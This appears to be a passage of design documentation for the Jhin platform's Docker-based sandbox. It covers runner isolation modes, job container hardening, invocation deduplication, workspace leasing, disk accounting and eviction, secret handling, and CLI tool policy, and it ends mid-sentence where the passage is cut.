# Sandboxing architecture

Jhin executes every `cli.*` call in a fresh, ephemeral, locked-down Docker
container. The control path is `tool-worker → sandbox-runner`; model reasoning
never receives Docker authority, runner credentials, or an executable connector
catalog.

## Components and execution path

```text
services/tool_worker/             policy, connector execution, runner client
services/sandbox_runner/          authenticated job API and Docker lifecycle
  rootless_transport.py           fixed rootless TCP-to-Unix adapter entrypoint
packages/connectors/.../cli/      five cli.* tool definitions and executors
docker/sandbox.Dockerfile         default job image (jhin-sandbox:latest)
packages/db/.../models/sandbox.py durable sandbox_job projection
```

```text
model response                                                [agent-worker]
  → atomically bind the ordered canonical tool manifest       [agent-worker]
  → schema, live grant, scope, policy, and approval            [tool-worker]
  → stable ToolCall claim and connector execution             [tool-worker]
  → authenticated internal job request                        [sandbox-runner]
  → fresh job container, then forced removal                  [Docker]
  → sanitized durable transcript/timeline projection          [agent-worker]
```

The agent process handles the model and private reasoning record. It does not
import connector executors, hold `SANDBOX_RUNNER_URL` or
`SANDBOX_RUNNER_TOKEN`, or join the Compose `runner` network. The tool worker
holds the master key needed for short-lived connector resolution and reaches
the runner over that private network. Only the runner or the fixed rootless
adapter receives Docker authority.

## Three mutually exclusive Docker modes

The base Compose file intentionally supplies no Docker endpoint. Every start,
render, recreate, or upgrade must use `compose.yaml` plus exactly one of
`compose.rootless.yaml`, `compose.rootful.yaml`, and `compose.desktop.yaml`.
Base-only and multi-overlay stacks fail the boundary contract. Operator
commands disable implicit `.env` loading so an old local mode or production
value cannot silently select authority.

| Mode | Host | Runner reaches Docker through | Extra runner group | Daemon identity check | Intended use |
| --- | --- | --- | --- | --- | --- |
| `rootless` | Linux | fixed `rootless-docker-transport` adapter on the internal `engine` network | none | `SecurityOptions` contains `name=rootless`, cgroup v2, systemd driver | servers and CI |
| `rootful` | Linux | root-owned non-symlink socket mounted at `/run/jhin/docker.sock` | exact `SANDBOX_DOCKER_GID` of that socket | not rootless | servers and CI |
| `desktop` | macOS / Windows Docker Desktop | VM socket mounted at `/run/jhin/docker.sock` (`uid 0 / gid 0`) | root group `0` | `OperatingSystem` contains `Docker Desktop`, not rootless | local development only |

In every mode, `sandbox-runner` has the exact runtime identity `10001:10001`,
drops every capability, is non-privileged, and has
`no-new-privileges:true`. Its Docker authority is validated before it creates
the sandbox network or reaps any artifact. A version probe and daemon identity
probe must pass first; failed startup closes the Docker client and performs no
mutation. `SANDBOX_DOCKER_MODE` has no default: an omitted or unknown mode is
a configuration error.

### Rootless mode

Rootless mode runs the entire stack against an already-running rootless daemon
whose host Unix socket is owned by UID 10001. Host preflight uses `lstat` and
rejects a relative path, symlink, non-socket, wrong owner, or daemon whose
security options omit `name=rootless`.

The `rootless-docker-transport` adapter alone mounts that socket. Its container
identity is `0:0`, but only inside the rootless daemon's user namespace:
container UID 0 maps to the unprivileged host daemon user. The adapter is
non-privileged, drops all capabilities, is read-only apart from `/tmp`, accepts
no arguments or Docker-related environment override, has no supplemental group, and exposes only the fixed private endpoint
`http://rootless-docker-transport:2375` on the internal `engine` network.

The adapter and runner use the exact same explicit local image tag. Operators
build `sandbox-runner` before the adapter can start, and the adapter declares
`pull_policy: never`; it cannot fetch an unreviewed image independently. The
adapter's health check performs a real Docker `GET /_ping` and requires status
200 with body `OK`. The runner starts only after that service is healthy, then
its own `/health` performs a daemon-backed ping.

Compose health alone does not restart an unhealthy container. An upstream or
copy failure therefore makes the adapter exit; `restart: unless-stopped`
relaunches it. The runner reports HTTP 503 while Docker connectivity is absent.
An explicit adapter restart also restarts the dependent runner through the
Compose dependency contract. The adapter must become healthy before runner
readiness is accepted.

### Rootful mode

Rootful mode mounts one operator-verified Docker Unix socket directly into the
runner at `/run/jhin/docker.sock`. The host path must be absolute, must not be a
symlink, must be a socket owned by UID 0, and must have an exact positive
numeric group. `SANDBOX_DOCKER_GID` must equal that `lstat` group and becomes
the runner's sole additional group authority. The runner verifies effective
read/write access. Wrong path, type, owner, GID, access, identity, or any extra
group is a fatal startup error; the deployment must repair its Docker setup,
not weaken permissions or elevate the service.

The rootful mode has no daemon-service dependency: there is no adapter or
`engine` network member, and runner health talks to the mounted socket. It does
not inherit a rootless transport URL.

### Desktop mode (macOS / Windows, local development only)

Docker Desktop runs the daemon inside a Linux VM. On the host,
`/var/run/docker.sock` is a compatibility symlink to a user-owned socket under
`~/.docker/run/`; inside any container that mounts it, the same endpoint is a
Unix socket owned by `uid 0 / gid 0`. Neither the rootful contract (real
root-owned non-symlink socket with a positive docker GID) nor the rootless
contract (host UID 10001 daemon) can be satisfied, so `desktop` is an explicit,
opt-in third mode rather than a relaxation of the other two.

`compose.desktop.yaml` mirrors the rootful overlay: it bind-mounts
`${SANDBOX_DOCKER_SOCKET_HOST:-/var/run/docker.sock}` at
`/run/jhin/docker.sock`, sets `SANDBOX_DOCKER_MODE=desktop`, supplies no
`SANDBOX_DOCKER_GID` and no transport URL, and adds exactly `group_add: ["0"]`.
The runner still runs as `10001:10001` with every capability dropped and
`no-new-privileges:true`; at startup it requires the mounted path to be an
absolute, non-symlink Unix socket owned by UID 0 and GID 0, requires the root
group to be its only supplemental group, verifies effective read/write access,
and then requires the daemon reached through that socket to report an
`OperatingSystem` containing `Docker Desktop`. A Linux host daemon, a rootless
daemon, a symlink, a foreign GID, an extra group, or a configured
`SANDBOX_DOCKER_GID` is a fatal startup error. Job constraints (network policy,
identity, limits, cleanup, secret redaction) are identical to the other modes.

Host preflight in the harness and in `assert_phase10_tool_worker_compose.py
--mode desktop` is the one place a symlink is accepted: the configured path is
resolved to its real socket target, that target becomes the immutable
snapshotted authority and the bind-mount source, and `docker info` must report
Docker Desktop and no `name=rootless` option.

**Desktop harness caveats.** Two behaviours of the Docker Desktop daemon
differ from a Linux daemon and are handled explicitly rather than skipped:
the runner container reports `GroupAdd: ["0"]` (the root group, because no
socket GID exists), which the live boundary assertions expect only in
`desktop` mode; and BuildKit may assign distinct image IDs to identical
per-service builds that run in parallel, so the upgrade overlay gives every
current worker of one kind one explicit `image` tag
(`jhin-phase10-{agent,tool}-worker:<token>`) that the harness builds exactly
once before recreating the four services with `--no-build`.

**Threat-model caveat.** Root-group membership inside the runner container is
strictly weaker than the rootful exact-GID or the rootless user-namespace
boundary: any file in the runner image that is group-`0` writable becomes
reachable, and the socket grants full control of the Desktop VM daemon, which
already belongs to the developer. That is acceptable for a single developer's
laptop and nothing else. Never select `desktop` on a shared host, a server, or
CI; the mode exists so that `make test-integration PHASE10_MODE=desktop` and
the full stack (including CLI sandbox jobs) run on Docker Desktop with the
same fail-closed startup contract.

### Readiness

Startup uses bounded `up -d --build --wait --wait-timeout` and then `ps --all`
with the exact service set for the selected mode. Rootless requires
`rootless-docker-transport` in addition to the base production services;
rootful and desktop forbid it. Every returned row must be running, and every service with
a health check must be healthy. Absence, duplicate rows, exited services,
blank health, or extra mode-specific services fails closed. Phase 10 Task 10
owns the current-image live start, recreate, crash, and upgrade acceptance
commands; static render success alone is not live acceptance.

## Network and endpoint isolation

Compose owns explicit nonexternal bridge networks. The global `runner` network
contains exactly the tool worker and runner. In rootless mode, the internal
`engine` network contains exactly the adapter and runner. The API, agent,
workflow, and event workers join neither network.

Job containers receive no socket, adapter endpoint or DNS, engine or runner network, Docker-related environment authority, or supplemental group. They
cannot resolve the tool worker, adapter, runner, agent worker, API, database,
NATS, or Temporal by control-plane DNS. Host inspection in the live security
gate checks the actual container's user, network mode, `GroupAdd`, environment,
mounts, and exact job label instead of relying on an in-container guess.

Two job network policies are available:

- **`none`** uses Docker `NetworkMode: none`; the job has no external or
  control-plane network access.
- **`internet`** joins the configured dedicated sandbox bridge. The name must
  satisfy the bounded safe grammar, must not be a Docker reserved/container
  mode, and must not alias any authority network. No production control service
  is attached to it.

The dev overlay attaches only `fake-github` to the sandbox network for
integration tests. This test exception must never be copied to a production
service.

## Job isolation

Every job container is created with this fixed security shape:

| Control | Value |
| --- | --- |
| User | exact `1000:1000` |
| Root filesystem | read-only |
| Writable storage | exactly one named workspace volume, plus bounded tmpfs |
| Capabilities | `CapDrop: ALL`, nothing added |
| Privilege | non-privileged and `no-new-privileges:true` |
| Groups | empty `GroupAdd` |
| CPU / memory / pids | capped at 2 CPUs / 4 GiB / 256 pids |
| Timeout | capped at 30 minutes, then force-killed |
| Host authority | no host bind, Docker socket, adapter URL, or control network |
| Cleanup | force-removed in `finally`, with startup orphan reaping by exact label |

One job gets one fresh container. What survives it is the named volume mounted
at `/workspace`.

### One dispatch per invocation

A tool call whose worker dies is re-dispatched with a fresh `job_id`, so nothing
on the wire relates the two attempts. The control plane cannot settle it — the
fact it needs, what the first container did, is precisely the fact its dead
worker failed to write down — and neither can the file the job edited, because a
file's contents are an *effect* and the question is about an *event*. The runner
is the only process that sees both attempts, so the answer lives there: a
request carries `invocation_id` (Jhin's `tool_call.id`, stable across a
re-dispatch and distinct for every genuinely new call), and a second dispatch of
one invocation is **handed the first dispatch's job** — running, or finished with
its outcome intact — instead of a container of its own. The caller polls the job
it is given rather than the one it sent, and the audit trail records
`attached_to_job_id` on the dispatch that ran nothing. This is what makes every
sandbox tool safe to re-dispatch, and it is why no tool carries a guard of its
own that inspects the file it wrote.

Three things hold that up, and each is a way it failed:

**It records what happened, not what was intended.** The ledger entry is written
when the dispatch is accepted, which is what makes the claim atomic: two
dispatches arriving together cannot both find the invocation absent. But a
dispatch that gives up in the workspace queue below has started no init
container, taken no measurement and run no container — and keeping it as the
invocation's answer meant every later dispatch of that call was replayed onto a
failure and the call was never run at all. That entry is taken back as such a
job ends. Only that ending: past the queue, an init container has already
touched the disk and the runner cannot prove nothing happened.

**It is bounded, and it says what it has forgotten.** Nothing in the runner used
to expire, so a job's captured output — two streams, capped at 64 KiB each — was
held for the life of the process. Now the most recently finished
`sandbox_job_output_retained_jobs` (32) keep what their container printed and
the rest release it, reporting `…[output no longer retained by sandbox runner]`
rather than an empty stream, because "printed nothing" and "no longer held" are
different facts. The record itself — status, exit code, timings — is kept an
hour past the later of its ending and its own deadline
(`sandbox_job_record_retention_seconds`). That length keeps the ordinary case
cheap for the reconciliation sweep in the tool worker, which asks about a job
whose worker died — but it is not what makes the sweep's reading of a 404
*sound*, and it cannot be: the window is measured against a sweep that runs,
and a worker that is down for longer than it comes back to rows hours past
their deadline, for jobs this runner finished and dropped. So the runner
publishes what its memory covers instead of promising a number the other side
has to trust — `GET /v1/runner/memory` gives `serving_since` (after the reap,
so a job that started before it had its container force-removed) and the
retention window itself, and the sweep closes a row on a 404 only where those
two make it proof. Everything else it closes as `outcome_forgotten`: the job is
over, and what it did is no longer recoverable from anybody. When a record does
go, its ledger entry goes with it and the runner moves a watermark — because "I
hold no record of that invocation" only means "it was never submitted here" for
dispatches after the point from which the runner remembers everything.

**It fails closed at both ends.** Inside one runner incarnation the ledger is
exact. Across a restart it is empty by construction, and then the only interlock
left is `prior_dispatch_at`: the moment the *earliest* dispatch of this call
began, computed by the tool worker from its own `sandbox_job` rows. A dispatch
stamped at or before the runner's watermark is one it cannot vouch for, and it
is refused (`409`, surfacing as `redispatch_unprovable`) rather than run a second
time on top of however far the first got. The worker holds the same line one
step earlier: the three answers to "was there an earlier dispatch" are separate
types, and the one that means *this could not be established* has no
`prior_dispatch_at` field to put on the wire at all — so a lookup that fails
refuses the call (`redispatch_uncheckable`, carrying the reason) instead of
claiming to be a first dispatch. The same discipline covers the other half of
that worker-side write: the `sandbox_job` row is committed on its own connection
*before* the job is submitted, and an insert that fails **for any reason at
all** refuses the dispatch too — a dispatch nothing recorded is a container the
next re-dispatch would fail to see. A constraint refusal is no exception, and
used to be: it was read as proof that the `tool_call` this row references is
uncommitted, which `sandbox_job`'s four foreign keys and its primary key make
unknowable from an `IntegrityError`, and which the gateway makes moot anyway by
committing that row before any executor is entered.
All of these refusals report nothing about *this* attempt, which certainly ran
nothing, and everything about the earlier one: `side_effect_possible` follows
whether a job of that shape could have changed the disk, so an unaccounted-for
listing is a plain retry and an unaccounted-for edit stops for a person.

Two dependencies hold that comparison up, and neither is left to be inferred by
whoever calls this next.

**Saying nothing is not an answer.** `prior_dispatch_at` is empty when there was
no earlier dispatch, and empty is also what a client that has never heard of the
field sends — so shape validation cannot tell "I established there was none"
from "I was not asked". That distinction is the whole interlock, and it is safe
today only because exactly one caller exists and it always answers. So a request
that offers an `invocation_id` and omits `prior_dispatch_at` is refused (`422`),
at the schema and again in `JobManager.submit` for anything reaching it in
process. A caller that offers no invocation at all is unaffected: it gets no
ledger entry and the field is never read for it, which is what keeps an older
tool worker working against a newer runner.

**The two clocks are assumed to be one clock.** The comparison is between the
tool worker's clock, which stamps the row, and the runner's, which holds the
watermark; `_INCARNATION_SKEW` (5s) is a margin for *ordering* — the caller
stamps and then submits — not a synchronisation budget. The shipped topology
makes that sound, because both are containers on one Docker host and read the
host's clock. **If you split them across hosts, keep those hosts
NTP-synchronised to well inside five seconds**, or widen the margin to cover the
drift you actually have: a tool worker whose clock runs ahead stamps dispatches
that look newer than the runner's memory, and that is the direction which
produces a second container rather than a refusal. The detectable half of a
violation is detected — a dispatch stamped in the runner's own future by more
than the margin is refused, naming the clocks, since on one host it cannot
happen — but a caller running *behind* only causes needless refusals and is not
worth failing on.

The runner's startup reap is the one place that does not distinguish whose job a
container is: it force-removes everything labelled `jhin.sandbox.job` on the
daemon. One runner per daemon is what the compose topology gives, and the same
assumption is already load-bearing in the sweep that reads a 404 as proof. A
second runner on one daemon means giving both a configured identity, labelling
jobs with it, and filtering both sweeps on it.

### The workspace an agent keeps

Every job of one agent shares the volume `jhin-sandbox-ws-agent-<workspace
id>-<agent id>`, and it **outlives the run that created it**. That is what makes
an agent a software engineer rather than a first-day contractor: the checkout,
the dependency install and the build cache are still there on its next turn, so
"change it, test it, fix it, push it" does not pay for a cold clone at every
step. `cli.repository.checkout` refreshes a tree it already has (validate the
remote, empty `.git/hooks`, `reset --hard`, `clean -ffd` *without* `-x` so
ignored build output survives, fetch) and reports `reused` so the model knows
whether its caches are warm.

**A checkout onto a branch that already exists continues it.** That is a
separate question from whether the disk was reused, and it is what makes a
second turn able to build on the first. The refresh used to end in
`git checkout -B <branch> FETCH_HEAD`, which force-moved the working branch
onto the base ref: run two rewound past the commit run one had already pushed,
worked on top of the base, and had its push rejected as a non-fast-forward with
nothing published. The starting point is now chosen from what exists, and
reported as `started_from`:

| `started_from` | When | What the agent gets |
| --- | --- | --- |
| `remote_branch` | `refs/heads/<branch>` is on the remote, and this disk's copy is not ahead of it | the published tip — the commit an earlier run pushed. Independent of the disk, so an evicted, purged or re-cloned workspace resumes the same branch |
| `workspace_branch` | this disk has the branch and it already contains everything the published one does, or the remote has no such branch | its own unpushed commits, kept rather than discarded for being unpublished |
| `base` | the branch exists nowhere yet | the base ref, as before |

A local branch that has *diverged* from the published one cannot be pushed
without rewriting somebody else's history, so the published tip wins and the
abandoned local head is recorded as `discarded_head`. There is deliberately no
"start this branch over from the base" flag: it would rewind the branch the
push then has to fast-forward, which is the rejection above. Starting from the
base is spelled by asking for a branch name that is not in use.

The default name is `agent/<repo>-<task id>`, with the whole task id. It used
to be the id's first eight characters, which are the top 32 bits of a uuid7's
48-bit millisecond timestamp: they advance once every 65.536 seconds, so two
different tasks on one repository started in the same minute took the same
branch name and the second one resumed the first one's work.

The key is derived from identity alone — `ctx.agent_id`, which the tool worker
reads from the `agent_run` row and never from tool input. Two agents therefore
derive two keys, two keys are two volumes, and a job is given exactly one mount
and no Docker socket. That is the whole isolation argument, and none of it rests
on a model behaving.

**Two runs of one agent never share a tree.** A chat turn while a task runs
(or a self-delegating sub-run, which carries the same agent id) is common.
Exactly one run holds the agent's workspace, tracked by `holder_run_id` on the
`sandbox_workspace` row and taken by a single conditional `UPDATE`; the other
gets a private `jhin-sandbox-ws-run-<run_id>` volume with today's behaviour and
today's guarantees. Nothing is shared and nothing waits. A lease is never taken
from a run that is still alive — liveness is read from the holder's own
`agent_run.status`, so a run parked on an approval for hours keeps its disk —
and no clock ever overrides that: nothing in `agent_run` moves while a run is
alive, so a run parked on a push approval for two days and a run that crashed
without finalizing look identical, and the contender takes a private disk
instead of deleting a tree somebody is about to push from. A workspace stranded
by a run that never finalizes is freed by `jhin-admin agent workspace reset`,
which is a deliberate act by somebody who can see the run. A run whose lease
*was* taken that way is refused with `workspace_lease_lost` rather than silently
continuing on a fresh disk with its checkout on the old one.

**One job at a time on one disk.** The lease above decides which *run* holds a
workspace; the runner decides how many containers are on it, and the answer is
one. A job whose `workspace_key` is held waits for it — reported as `queued`,
which is not a terminal status and which a poller treats exactly like
`running` — and gives up, having started no container and no volume-init
container, after `sandbox_workspace_queue_seconds` (30s).

This queue is **not** what stops a re-dispatch, and it used to be described as
though it were. It cannot be: waiting for the first dispatch's container and
then running a second is exactly how an edit gets applied twice. That case is
settled one wall up, at the invocation, where a second dispatch is handed the
first one's job and never reaches this queue at all. What is left here is
genuinely concurrent work — two calls that are not the same call and both want
the same disk: a run's cleanup against a turn that is still going, or two runs
of one agent. It lives in the runner because the runner is the only process that
knows a container is still on that volume. Two containers on one tree is a
data-loss bug for `cli.repository.checkout` above all, whose first act on a
reused workspace is `reset --hard` and `clean -ffd`.

**Finalize releases, it does not destroy.** The cleanup activity clears the
holder on an agent workspace and calls the runner not at all; a private run
workspace still gets `DELETE /v1/workspaces/run-<id>`, idempotently, as before.

**Bounds.** There is no filesystem quota to fall back on, and the alternatives
were tried against this daemon rather than argued about:

| asked for | daemon's answer |
| --- | --- |
| `docker volume create --opt size=64m` | `quota size requested but no quota support` |
| `--opt type=ext4 --opt device=<image file>` | `block device required` |
| `--opt type=ext4 --opt device=<file> --opt o=loop` | `data: loop: invalid argument` |
| `losetup` inside a container | `cannot find an unused loop device: No such device` |
| `losetup` inside a **`--privileged`** container | `failed to set up loop device: Permission denied` |

The first is the quota route: it means an xfs filesystem mounted with `pquota`,
and the storage driver here is overlayfs. `type=tmpfs` does enforce a size, but
that is RAM and so not a place to keep a clone, and `StorageOpt` bounds a
container's writable layer rather than a mounted volume.

The rest are the *fixed-size filesystem image* route — a 5 GiB ext4 file
mounted per workspace, which would be a hard quota the kernel enforces and
would make the measurement advisory. It does not work here, and the reason is
not preference. Docker's `local` driver passes `device` straight to `mount(2)`
and never attaches a loop device, so a file is refused as "not a block device"
and `o=loop` is passed through as mount data and rejected; and no container on
this daemon can attach one itself, `--privileged` included, so there is nothing
to hand the driver either. Even where loop devices *are* available, the shape
is wrong for this service: the attach and the mount need `CAP_SYS_ADMIN` and
`/dev/loop-control`, and the resulting mount would have to reach the job
container as a host path — a privileged container and a host mount, which are
the two things the runner's isolation is built out of not having.

So the cap is an accounting cap, and the accounting is the whole of the bound,
which is why it has to be right in three ways: it has to measure disk usage,
it has to measure what `du` measures, and it has to know when it has not
measured at all. (An operator who wants a kernel-enforced bound has exactly one
route: put the Docker data root on an xfs filesystem mounted with `pquota`, at
which point the `local` driver's `size` option starts working. Jhin does not
require it, and does not pretend to have it.)

*It measures disk usage, not apparent size.* The walk sums allocated blocks
(`st_blocks * 512`), which is what `du` counts and what an operator will compare
the number against. Summing `st_size` instead reported a workspace holding a
2 GiB `fallocate -n` pad at 8 KiB and 100k one-byte files at 2.4 MiB rather than
393 MiB — the cap never fired, the volume was never recycled, and eviction never
saw it.

*It measures what `du` measures, by construction.* Two properties, and the
target is agreement to the byte with `du -sB1` rather than agreement in the
common case:

- **It descends by directory file descriptor** (`openat`/`fstatat` on names,
  never on assembled absolute paths), so `PATH_MAX` does not exist for it. A
  walk that let `DirEntry.stat` fall back to `lstat(entry.path)` failed
  `ENAMETOOLONG` below roughly 4 KiB of ancestry and dropped the whole subtree
  silently: twenty 200-character directories holding one 6 GiB file measured
  90,112 bytes and reported the walk complete, against a 5 GiB cap.
- **A file with more than one link is counted once**, keyed on its inode,
  which is exactly what `du` does. Summing every link read 200 links to a
  50 MB file as 10.5 GB against du's 52 MB, and two `git clone --local` copies
  of a 40 MB repository 49.9% high — and hardlinking from a store is ordinary
  behaviour for pnpm, uv and pip, not an attack. Over-counting is **not** the
  safe direction: this number is read by an eviction that destroys the volume,
  so an over-count throws away an agent's unpushed work. Under-counting only
  delays a cap.

*A walk that did not finish is not a measurement.* Anything the walk skipped,
for any reason — the budget ran out, an entry could not be stat'd, a directory
could not be opened, another filesystem is mounted underneath — makes the
result a **floor**: the disk holds at least that much, and nothing more is
known. The row records it as `size_state = 'unknown'` next to the floor, and
the platform **refuses** the workspace's next call (`workspace_unmeasured`)
rather than enforcing a cap against a number that is not the disk's.

That is not the cautious reading it looks like; it is the only honest one.
3,000 directories of 1,000 empty files with a 6 GiB payload in the directory
`scandir` returns last measured 12 to 21 MB through the deployed runner, six
runs in a row, against a real `du -sB1` of 6,530,826,240 — 0.3% of the truth,
which is under every cap in the product, so nothing was recycled and nothing
was refused. A floor is only ever evidence in one direction, and the product
uses it in exactly that direction: a floor **above** the cap proves the disk is
over it and recycles as usual, while a floor below the cap proves nothing at
all and refuses. Guessing small is the cap not existing; guessing large and
emptying the disk destroys a day's uncommitted work on the strength of a
measurement that failed. A refusal costs a run, and that is the only one of the
three prices worth paying. The remedies are the ones the hint names — push the
branch (the push is exempt), then `jhin-admin agent workspace reset` — plus
idle eviction, which answers to age and needs no size at all.

A measurement also always **replaces** what was stored. It used to ratchet: a
floor was kept only when it exceeded the stored number, so that a partial walk
could never undo a complete one. What that built was a paper size with no
expiry — one complete measurement of 4.9 GB, then six walks that all timed out,
and the row still said 4.9 GB days after the agent deleted the data. Since the
budget sweep takes the largest first, that agent was first in line to have its
live work destroyed to free space that had already been freed. The state flag
is what makes replacing safe: a floor cannot be mistaken for a size, so it does
not have to be inflated to be safe.

*It measures often.* Every workspace is measured on **every** job by the root
init container that already runs there, so an overrun is bounded by one job
rather than by one measurement interval — for run-scoped workspaces too, which
used to keep a ten-minute throttle on the grounds that they die with their run,
while their bytes counted against the tenant budget the whole time they lived.
Within that one job nothing stops a container filling the host's disk: the
honest statement of the bound is "one job", not "5 GiB". The walk budget is
`SANDBOX_WORKSPACE_MEASURE_BUDGET_SECONDS` (60), and it is a ceiling rather
than a duration: an ordinary tree finishes in well under a second and stops,
and three million entries — the tree above — finish in about sixteen. It was
five, which could not finish a tree an agent can build in seventy seconds.

A workspace is destroyed only at bind time, before any container of the new run
starts — the one moment it is provably idle. It is emptied then if an operator
asked for a reset, if it has been idle past `SANDBOX_WORKSPACE_IDLE_DAYS` (7),
or if it is over `SANDBOX_WORKSPACE_MAX_MB` (5 GiB, and never more than the
tenant total below — a per-agent cap above the tenant budget lets one agent put
its tenant somewhere no sweep can rescue it from).

If the **tenant** is over `SANDBOX_WORKSPACE_TOTAL_MAX_MB` (40 GiB), the budget
sweep is **all-or-nothing**. Its candidates are the workspaces no live run
holds, plus the binder's own — provably idle at that instant, and recycled
rather than evicted because the run is about to use it. It takes the largest
first, so the fewest agents lose a disk. But before it takes anything it asks
whether those candidates add up to the overrun, and **if they do not it takes
nothing** and the bind is refused with `workspace_tenant_full`, which names the
real situation: the space is held by runs that have not finished. The refusal is
recorded as `sandbox.workspace.budget_refused` with how far over the tenant
was, because a decision to destroy nothing has to be as visible as a decision
to destroy something. The refused run is left holding no lease, so the refusal
repeats for as long as the situation lasts rather than being served by the very
next call's renewal — and it ends by itself when the run holding the space
finishes and that disk becomes reachable.

The gate holds **inside** the loop as well as before it. A plan that added up
when it started stops adding up when the runner refuses one of its deletes, and
the loop notices at the next candidate and destroys nothing further — but the
disks it already took are gone, so the bind is refused too. Treating a refused
delete as a machine's bad moment and serving the bind anyway produced exactly
the shape the gate exists to prevent: neighbours destroyed, tenant still over
budget, and the call that paid for it served.

**Every durable disk of the tenant is on the books, and "held" means one thing.**
Two ways a real disk used to be invisible to the budget, both of them the sweep
asking a question the rest of the module answers differently:

- *Kind.* The scan selected `kind = 'agent'`, so the private run-scoped disk a
  contended run takes was measured, stored, occupying disk and contributing
  nothing. A 10 GiB run workspace sat inside a 52 MB budget with the total
  reading zero and a third agent's bind served. Both kinds are counted now, and
  both follow the same rule: a live run's disk is never taken, so the tenant is
  refused while it runs and the disk becomes reclaimable when it stops.
- *Holder.* The sweep read "held" as `holder_run_id IS NOT NULL` while the
  acquire reads the holder's own `agent_run.status`. A run that finished without
  finalizing leaves its id on the row — the state the acquire's own contract
  acknowledges — and the two readings then disagree: the acquire would hand
  that disk out, while the sweep excluded it from the idle pass, from the
  budget pass, and from any hope of freeing the bytes it was still counting.
  One stale id was enough to leave a tenant permanently over budget with
  nothing any bind could free. Both now ask the holder's status.

**A size Jhin does not have is not a small size, and not a licence either.** An
unmeasurable disk is *charged* the larger of its floor and the per-agent cap,
because a disk nobody counted must not be spent for free — and it is never a
candidate for destruction, because destroying it would be acting on the number
that is missing. The two halves are kept apart in the arithmetic: the sweep
plans what to destroy against the bytes the table has actually seen, and
decides what to refuse against the bytes it cannot rule out. So an unmeasurable
disk can leave a tenant unable to prove it is under budget — and the answer to
that is a bind that waits, never a neighbour's tree that disappears.

That gate is the policy, not an optimisation: *destroying another agent's
durable work is only justified when it achieves the thing it is destroying work
for.* The overspender is usually neither the binder nor free — two runs of one
agent overlap, and a run parked on an approval holds its lease for as long as
the approval takes. Without the gate, a tenant 52 MB over budget because of one
100 MB workspace held by a live run destroyed four unheld 4 KiB neighbours and
the binder's own 4 KiB row, freed 20 KiB, stayed over budget, refused nothing,
and never went near the disk that was spending the budget.

Idle eviction is a separate pass and still least-recently-used first, because
idleness is a question about age and the budget is a question about bytes; it
takes what is past the horizon whether or not the tenant is over budget, and it
answers to its own reason rather than to the overrun. The sweep never crosses a
tenant boundary: it runs on one tenant's agent's bind, and one tenant's total is
not a budget to be paid out of another tenant's work. A workspace that crosses
its cap *while a run is using it* is never destroyed: the next call is refused
with `workspace_full`, so the agent can still push what it has — and
`cli.repository.push`, the one call that exemption exists for, is also the one
call whose own workspace the budget sweep will not take and the one call the
tenant refusal does not apply to, because destroying or blocking it there would
strand the branch the push was about to send.

An eviction is only recorded once the volume is actually gone. `DELETE
/v1/workspaces/{key}` answers 204 for a volume it removed and for one that was
never there, and **409** when Docker refuses because a container still has it
mounted; a refusal leaves the row exactly as it was, keeps a pending reset
outstanding, and the next bind tries again. Recording a refused delete as an
eviction wrote `size_bytes = 0` for a disk that was still full and returned it
to service invisible to the cap and to every future sweep.

**The repository allow-list follows the disk.** `cli.repository.checkout` and
`cli.repository.push` name a repository and are checked on the name. Every other
sandbox tool names none, so those are checked against what the workspace
actually holds: every repository recorded on that disk since the disk was last
*emptied*, from Jhin's own `sandbox.checkout.recorded` rows keyed to the
workspace. The disk rather than the last record, because a disk is not a path —
a copy taken anywhere but `/workspace/repo` survives a later checkout (the reuse
prologue removes that one path), `HOME` is `/workspace` so pip and npm leave a
private repository's packages in `/workspace/.cache` with nobody meaning
anything by it, and checking out an allowed repository used to move the record
forward and turn the answer back to "allowed" with the forbidden tree still
readable. Only two things end a disk's history: the volume being destroyed, and
a checkout that purged the workspace. So the remedy the denial prints is real —
a checkout onto a workspace whose history is no longer fully allowed empties the
**whole** workspace before cloning and records that it did (`purged: true`), and
`jhin-admin agent workspace reset` does the same by destroying the volume.

Reuse of a clone is bound to the same records: a tree is adopted as a
repository's cache only when the last checkout on that disk named this
repository *and* `.git/config` still hashes to what that checkout wrote, which
is the proof `cli.repository.push` already demands. A clone of something else
with its remote rewritten does not qualify.

**What the allow-list is not.** It is not an egress control. `cli.command.execute`
granted `network: "internet"` can clone anything it likes and no record will name
it; an allow-list over Jhin's own repository operations cannot bound what an
arbitrary command does with a network, any more than it can stop that command
reading a file and printing it. The controls for that are the connection's
`default_network`, the `network` grant scope, and the sandbox bridge itself —
which is why the setup guidance below says to leave `default_network` at `none`.

Startup reaping still removes leftover job containers by label and workspace
volumes older than 24 hours — **run-kind only**. Creation age is not use age, and
reaping agent volumes by age would wipe a healthy agent's disk every day, which
is the bug this design exists to fix.

**Operator surface.** `jhin-admin agent workspace list` / `show` / `reset`. All
three are database reads and writes: the API container is deliberately not on
the `runner` network and holds no runner token, so `reset` records a request and
the next bind applies it rather than pretending the console can reach Docker.

Stdout and stderr have independent byte caps. The runner registers every
job-scoped secret value, redacts it before returning output, and forgets it with
the job. Tool-worker applies its process redactor again before persisting a
`sandbox_job` row or tool result.

## Secret split

The caller resolves and the runner relays:

1. Tool-worker reloads the authorized connection and decrypts or mints the
   short-lived credential.
2. It sends the value in `secret_env` over the private runner network.
3. The runner injects it only while creating the job, redacts captured output,
   and retains no master key or database credential.

This keeps secret-store authority and Docker authority in different processes.
Only `cli.repository.checkout` and `cli.repository.push` ever carry
`GIT_TOKEN`, and both run scripts Jhin wrote. The token reaches git through an
inline `credential."<git base>".helper` on Jhin's own command line, so it is
never in a remote URL, never in repository config, and never in a file the
agent can rewrite.

## CLI connector policy

| Tool | Risk | Scope keys (all fnmatch) | Required scope keys |
| --- | --- | --- | --- |
| `cli.command.execute` | write, approvable | connection, command, image, network | — |
| `cli.repository.checkout` | write, approvable | connection, repository, image | connection, repository |
| `cli.repository.push` | **elevated**, approvable | connection, repository, branch | connection, repository, branch |
| `cli.test.run` | write, approvable | connection, command, image | — |
| `cli.file.list` | read | connection, path | — |
| `cli.file.search` | read | connection, path | — |
| `cli.file.read` | read | connection, path | — |
| `cli.file.edit` | write, approvable | connection, path | — |
| `cli.file.write` | write, approvable | connection, path | — |

A CLI connection stores defaults, an optional GitHub connection reference, and
the repositories it may use — not a plaintext credential. Deny-by-default
remains in force in three independent places: the agent's grants, the
connection's `allowed_repositories` (enforced by a `ToolValidator` that re-runs
at policy decision, approval resume and execution bind, so narrowing the list
invalidates a parked approval), and the scope of the GitHub token itself.

`repository` is always `owner/name`, and neither half may be made of dots
alone: a `..` segment reads as an ordinary name to a pattern like
